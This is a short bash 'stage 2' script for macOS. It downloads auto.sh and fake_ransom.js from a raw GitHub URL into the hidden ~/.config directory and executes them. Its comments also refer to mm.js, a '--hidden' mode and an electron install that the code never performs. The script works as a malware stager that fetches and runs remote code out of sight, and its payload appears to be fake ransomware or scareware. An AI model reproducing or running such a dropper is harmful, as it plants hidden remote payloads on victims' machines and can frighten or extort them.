#!/usr/bin/env bash
#
# Mac-only pipeline (stage 2):
#   1. Download auto.sh, mm.js, fake_ransom.js from GitHub (via wget)
#   2. Run: bash auto.sh mm.js --hidden
#   3. Run: npm install electron
#   4. Run: bash auto.sh fake_ransom.js            (no --hidden)
#
# Each step only starts if the previous one exited 0.
#
set -euo pipefail

# ---------- CONFIG (edit these) ----------
GITHUB_USER="rahul-call"
GITHUB_REPO="inner"
BRANCH="main/ror"                       # main / master / tag
WORKDIR="$HOME/.config"    # where the files land
FILES=("auto.sh" "fake_ransom.js")
# -----------------------------------------

BASE_URL="https://raw.githubusercontent.com/${GITHUB_USER}/${GITHUB_REPO}/${BRANCH}"

# ---------- Pre-flight ----------


mkdir -p "$WORKDIR"
cd "$WORKDIR"

# ---------- 1. Download ----------
for f in "${FILES[@]}"; do
  echo "→ Downloading ${f} ..."
  # wget --quiet --show-progress -O "$f" "${BASE_URL}/${f}"
  curl -L -# -o "$f" "${BASE_URL}/${f}"
done
chmod +x auto.sh



# ---------- 4. Second run ----------
echo
echo "→ Running: bash auto.sh fake_ransom.js --hidden"
if bash auto.sh fake_ransom.js; then
  echo "✔ Stage 2 finished successfully."
else
  echo "✘ Stage 2 failed (exit $?). Aborting." >&2
  exit 1
fi

echo
echo "✔ Full pipeline complete."
